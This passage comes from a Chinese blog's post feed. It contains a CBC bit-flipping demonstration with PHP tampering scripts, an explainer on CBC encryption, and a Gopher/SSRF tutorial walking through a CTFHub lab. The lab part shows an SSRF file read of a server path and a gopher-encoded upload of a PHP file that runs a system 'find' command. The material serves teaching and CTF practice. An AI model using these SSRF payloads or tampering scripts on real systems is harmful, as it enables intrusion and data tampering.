class="line">	$iv     = base64_decode($iv);</span><br><span class="line">	<span class="comment">// 分段</span></span><br><span class="line">	$cipher_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$cipher_tmp[$i] = substr($cipher, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$plain = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 对于每一段密文都要进行解密</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// 先进行解密</span></span><br><span class="line">		$plain_i_tmp = decode($cipher_tmp[$i]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 再和上一段密文做异或运算</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_i_tmp[$j]));</span><br><span class="line">		&#125;</span><br><span class="line">		$plain .= $str_tmp;</span><br><span class="line">		$last_cipher = $cipher_tmp[$i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (substr($plain, <span class="number">0</span>, <span class="number">16</span>) !== <span class="string">"I               "</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"消息被篡改！"</span> . base64_encode($plain) . <span class="string">"是错误的！"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'plain'</span> =&gt; $plain</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = <span class="keyword">array</span>();</span><br><span class="line">$info[<span class="string">'iv'</span>] = $argv[<span class="number">1</span>];</span><br><span class="line">$info[<span class="string">'cipher'</span>] = $argv[<span class="number">2</span>];</span><br><span class="line">$data = cbc_decode($info[<span class="string">'cipher'</span>], $info[<span class="string">'iv'</span>], <span class="number">3</span>);</span><br><span class="line">var_dump($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>阿强给阿珍发了加密信息：</p>
<p><img src="https://cdn.yalexin.top/image-20220711211953054.png" alt="image-20220711211953054"></p>
<p>如果阿珍能够正常接受，解密后：</p>
<p><img src="https://cdn.yalexin.top/image-20220711212222566.png" alt="image-20220711212222566"></p>
<p>下面进行攻击模拟：</p>
<p>假设隔壁老王获悉了原始的明文、初始向量和密文</p>
<p>老王想把消息的第二段改为<code>hate</code>，他略加思考，写下了下面的篡改脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// hack_data.php</span></span><br><span class="line">$origin_iv = base64_decode(<span class="string">"bFQYFlR5BVdfHChTUGspWA=="</span>);</span><br><span class="line">$origin_cipher = base64_decode(<span class="string">"MmMvIWNOMmBoKx9kZ1web0kbTlNUeQVXXxwoU1BrKVh+dTYxbUA8bmYlEWppUhBh"</span>);</span><br><span class="line">$hack_msg = <span class="string">"hate            "</span>;</span><br><span class="line">$plain = <span class="string">"I               love             you............."</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">	<span class="comment">// x = Plain[2][1] ⊕ cipher[1][1] ⊕ 'a'</span></span><br><span class="line">	$origin_cipher[$i] = chr(ord($plain[$i + <span class="number">16</span>])  ^ ord($origin_cipher[$i]) ^ ord($hack_msg[$i]));</span><br><span class="line">&#125;</span><br><span class="line">$new_cipher = base64_encode($origin_cipher);</span><br><span class="line"><span class="keyword">echo</span> $new_cipher;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>他将信息篡改好，然后发给阿珍，阿珍解析出来后，暗号对不上（第一段明文不是<code>I</code>），并将错误信息发出来：</p>
<p><img src="https://cdn.yalexin.top/image-20220711144007390.png" alt="image-20220711144007390"></p>
<p>可以看得到，老王成功地将第二段明文修改好了，下一步就是将<code>iv</code>修改好。</p>
<p>老外略加思索，立刻写出来恢复<code>iv</code>的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// hack_iv.php</span></span><br><span class="line">$origin_iv = base64_decode(<span class="string">"bFQYFlR5BVdfHChTUGspWA=="</span>);</span><br><span class="line">$plain = <span class="string">"I               love             you............."</span>;</span><br><span class="line">$plain_erro = base64_decode(<span class="string">"TS4iICAgICAgICAgICAgIGhhdGUgICAgICAgICAgICAgeW91Li4uLi4uLi4uLi4u"</span>);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">	<span class="comment">// iv_new = plain ⊕ plain_erro ⊕ iv_old</span></span><br><span class="line">	$origin_iv[$i] = chr(ord($plain[$i]) ^ ord($plain_erro[$i]) ^ ord($origin_iv[$i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($origin_iv);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220711224840348.png" alt="image-20220711224840348"></p>
<p>阿珍立即收到错误的消息，老王成功棒打鸳鸯！🙃</p>
<hr>
<p>从这个例子中，我们学会了喜欢一个人的时候，要大胆地面对面说出来，不要整这些花里胡哨的的暗示。😁</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CBC</tag>
      </tags>
  </entry>
  <entry>
    <title>带你了解CBC解密</title>
    <url>/2022/07/09/%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3CBC%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<p><a href="https://www.jianshu.com/p/1001b4c2adeb" target="_blank" rel="noopener">https://www.jianshu.com/p/1001b4c2adeb</a></p>
<p><a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&amp;depth_1-utm_source=distribute.pc_relevant.no" target="_blank" rel="noopener">https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&amp;depth_1-utm_source=distribute.pc_relevant.no</a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>CBC</code>加密技术属于分组模式加密指将前一个密文分组与当前明文分组的内容混合起来进行加密，这样就可以避免<code>ECB</code>模式的弱点。</p>
<blockquote>
<p>对给定的随机密钥，每一块明文对应固定的密文块，即相同的明文组蕴含着相同的密文组，类似电码本的码字，这就是ECB模式</p>
</blockquote>
<p><code>CBC</code>模式的全称Cipher Block Chaining 模式（密文分组组链接模式），之所以叫这个名字是因为密文分组是像链条一样相互连接在一起。</p>
<p>本文参考自文章<a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&depth_1-utm_source=distribute.pc_relevant.no" target="_blank" rel="noopener">【Bugku Login4 (CBC字节翻转攻击)】</a></p>
<a id="more"></a>

<h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>先看流程图：<br><img src="https://cdn.yalexin.top/image-20220709182948691.png" alt="image-20220709182948691"></p>
<ol>
<li>分组：加密之前，先将要传输或者加密的明文数据进行分组，通常按照16个字节分为一组，如果最后一组不够16个字节，则会通过<code>\x0n</code>来补充，n代表补充的个数，例如最后一组的数组如果只有14个字节，那么后面两个字节以<code>\x02</code>进行填充，如果缺失的数目超过了10，则使用进十六制，例如如果最后一组数据只有6字节，那么最后10个字节都使用<code>\x0a</code>进行填充。我们称该明文为<code>plain</code>，每段明文我们成为<code>plain[i]</code></li>
<li>生成初始化向量：向量长度和分组长度一致，用于和第一组向量进行异或运算。我们称该向量为<code>iv</code></li>
<li>初始向量和第一段明文<code>plain[1]</code>进行异或运算，完事以后再经过特定的加密运算<code>encrypt()</code>，得到密文<code>cipher[1]</code></li>
<li><code>cipher[1]</code>继续和明文<code>plain[2]</code>进行异或运算，完事以后再经过特定的加密运算<code>encrypt()</code>，得到密文<code>cipher[2]</code></li>
<li>……</li>
<li>所有的明文都参与运算以后，将得到的<code>cipher[i]</code>组装合并，得到密文段。</li>
</ol>
<h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>解密过程实际上就是将加密过程逆着走一遍。</p>
<p>此外，我们还应该明白异或的原理：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 ⊕ 1 = 1</span><br><span class="line">x ⊕ x = 0</span><br><span class="line">x ⊕ 0 = x</span><br></pre></td></tr></table></figure>

<p>如果数据<code>A</code>和密钥<code>B</code>异或得到密文<code>C</code>，要想恢复<code>A</code>，只要拿着密钥<code>B</code>再和密文<code>C</code>异或，即可恢复明文<code>A</code>，这是因为异或满足结合律，且：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A ⊕ B = C</span><br><span class="line">则有：</span><br><span class="line">A ⊕ B ⊕ B = C ⊕ B</span><br><span class="line">即：</span><br><span class="line">A ⊕ 0 = C ⊕ B</span><br><span class="line">即：</span><br><span class="line">A = C ⊕ B</span><br></pre></td></tr></table></figure>

<p>还是先看流程图：</p>
<p><img src="https://cdn.yalexin.top/image-20220709185258788.png" alt="image-20220709185258788"></p>
<ol>
<li>分组：与明文分组长度一致。</li>
<li>将第一段密文<code>cipher[1]</code>进行解密<code>decrypt()</code>，该解密运算使用的函数应该和之前加密定义的函数互为逆函数，得到的中间数据再和之前加密过程定义的<code>iv</code>向量进行异或运算，即可获得第一段明文<code>plain[1]</code>。</li>
<li>第一段密文<code>cipher[1]</code>再和经过解密后的第二段密文<code>cipher[2]</code>进行异或运算，得到第二代明文<code>plain[2]</code></li>
<li>……</li>
<li>将得到的所有明文段组装，形成明文。</li>
</ol>
<h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>下面我将使用<code>PHP</code>代码模拟上述过程，为了简单起见，加密函数<code>encrypt()</code>就不写那么复杂，直接将待加密的数据和密钥异或，解密的时候将密文和密钥异或即可。</p>
<p>下面是<code>CBC</code>加密和解码的模拟：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 密钥</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="number">23</span>);</span><br><span class="line"><span class="comment">// 产生长度为 16字节 的随机 iv 向量，一个字符在计算机内部使用8比特表示，即一个字节</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_init_vector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$random_iv = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; <span class="number">16</span>;$i++) &#123;</span><br><span class="line">        $random_iv .= chr(rand(<span class="number">1</span>, <span class="number">128</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密运算</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 和密钥异或</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密运算</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 和密钥异或</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC 加密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_encode</span><span class="params">($plain, $len)</span></span>&#123;</span><br><span class="line">	$iv = get_random_init_vector();</span><br><span class="line">	<span class="comment">// 分段</span></span><br><span class="line">	$plain_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$plain_tmp[$i] = substr($plain, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$cipher = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 对于每一段明文都要进行加密</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// 上一段密文先和本明文做异或运算</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_tmp[$i][$j]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 再进行加密</span></span><br><span class="line">		$cipher_i = encode($str_tmp);</span><br><span class="line">		$cipher .= $cipher_i;</span><br><span class="line">		$last_cipher = $cipher_i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'iv'</span> =&gt; $iv,</span><br><span class="line">		<span class="string">'cipher'</span> =&gt; $cipher</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC 解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_decode</span><span class="params">($cipher, $iv, $len)</span></span>&#123;</span><br><span class="line">	<span class="comment">// 分段</span></span><br><span class="line">	$cipher_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$cipher_tmp[$i] = substr($cipher, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$plain = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// 对于每一段密文都要进行解密</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// 先进行解密</span></span><br><span class="line">		$plain_i_tmp = decode($cipher_tmp[$i]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 再和上一段密文做异或运算</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_i_tmp[$j]));</span><br><span class="line">		&#125;</span><br><span class="line">		$plain .= $str_tmp;</span><br><span class="line">		$last_cipher = $cipher_tmp[$i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'plain'</span> =&gt; $plain</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mydata = <span class="string">"hello, everybody, this is a string for test....."</span>;</span><br><span class="line">$info = cbc_encode($mydata, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"数据是：\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $mydata . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"加密后："</span> . <span class="string">"\n"</span>;</span><br><span class="line">var_dump($info);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"根据加密后得到的密文进行解密，得到的数据："</span> . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$data = cbc_decode($info[<span class="string">'cipher'</span>], $info[<span class="string">'iv'</span>], <span class="number">3</span>);</span><br><span class="line">var_dump($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220710144743355.png" alt="image-20220710144743355"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CBC</tag>
      </tags>
  </entry>
  <entry>
    <title>Gopher协议</title>
    <url>/2022/06/29/Gopher%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p>
</blockquote>
<a id="more"></a>

<p>该协议可以发送<code>get</code>和<code>post</code>请求，不过在此之前，我们应该先构造相应的数据包，然后进行<code>URL</code>编码，同时用<code>%0d%0a</code>替换回车换行符，而且使用该协议的时候，<code>ip</code>地址后面要跟上一个端口号。</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在windows端开启一个<code>nc</code>监听（在此之前，你应该先安装）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -p -l 9999</span><br></pre></td></tr></table></figure>

<p>然后在kali linux中通过<code>gopher</code>协议访问该端口.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.1.120:8989/hello_yalexin</span><br></pre></td></tr></table></figure>

<p>我们会在Windows端收到信息:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ello_yalexin</span><br></pre></td></tr></table></figure>

<p>正如你所见，可以收到信息，不过第一个字符并没有收到。</p>
<p><img src="https://cdn.yalexin.top/image-20220629142405790.png" alt="image-20220629142405790"></p>
<h3 id="发送GET请求"><a href="#发送GET请求" class="headerlink" title="发送GET请求"></a>发送GET请求</h3><p>在Windows端先准备一个<code>test.php</code>文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Hello ,"</span>.$_GET[<span class="string">"name"</span>].<span class="string">"!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个常见的<code>GET</code>请求<code>HTTP</code>包如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test.php?name=yalexin</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.28</span><br></pre></td></tr></table></figure>

<p>发送之前我们需要将其进行<code>URL</code>编码，你可以使用很多在线工具完成。</p>
<p>人生苦短，我用<code>python</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># parse.py</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">GET test.php?name=yalexin HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.1.28</span></span><br><span class="line"><span class="string">"""</span> </span><br><span class="line">urlStr = urllib.parse.quote(payload)</span><br><span class="line"><span class="comment"># 注意要用 %0D%0A 代替回车换行</span></span><br><span class="line">urlStr = urlStr.replace(<span class="string">'%0A'</span>,<span class="string">'%0D%0A'</span>)</span><br><span class="line">print(urlStr)</span><br></pre></td></tr></table></figure>

<p>在<code>kali</code>中发送：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.1.28:80/GET%20/test.php%3Fname%3Dyalexin%20HTTP/1.1%0D%0AHost%3A%20192.168.1.28%0D%0A</span><br></pre></td></tr></table></figure>

<h3 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a>发送POST请求</h3><p>准备一个<code>post.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Hello ,"</span>.$_POST[<span class="string">"name"</span>].<span class="string">"!"</span>.<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>POST</code>的<code>HTTP</code>包格式为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">host:192.168.1.120</span></span><br><span class="line"><span class="attribute">Content-Type:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attribute">Content-Length:12</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">name=yalexin</span><br></pre></td></tr></table></figure>

<p>使用脚本编码后再发送请求：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.1.28:80/POST%20/post.php%20HTTP/1.1%0D%0Ahost%3A192.168.1.28%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A12%0D%0A%0D%0Aname%3Dyalexin%0D%0A</span><br></pre></td></tr></table></figure>

<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>以<a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">ctfhub技能树</a>的SSRF的上传文件为例。</p>
<p>我们先看一下源码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>返回内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] != <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Just View From 127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>]) &amp;&amp; $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> getenv(<span class="string">"CTFHUB"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Upload Webshell</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"/flag.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以发现只能从127.0.0.1中访问该脚本，且必须上传一个非空文件后才可以拿到<code>flag</code></p>
<p>我们可以先访问一下该脚本：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>但是我们发现无法提交表单，但是不要紧，我们在浏览器中手动添加提交按钮即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>提交一个文件后发现出错：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Just View From 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>看来要借助<code>gopher</code>协议了</p>
<p>在此之前，我们借助burpsuite进行抓包（重复刚刚的提交文件动作）</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Length</span>: 340</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Origin</span>: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryy4kNDjSQVdU1NViJ</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="find.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">system('find / -name *flag*');</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">鎻愪氦</span><br><span class="line">------WebKitFormBoundaryy4kNDjSQVdU1NViJ--</span><br></pre></td></tr></table></figure>

<p>使用我们的脚本<code>parse.py</code>之前，我们应该将上述数据包中的<code>Host</code>改为<code>127.0.0.1</code></p>
<p>，由于浏览器会自动URL解码一次，因此我们还应该再URL编码一次，即：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 340</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy4kNDjSQVdU1NViJ</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="find.php"</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system('find / -name *flag*');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">鎻愪氦</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryy4kNDjSQVdU1NViJ--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span> </span><br><span 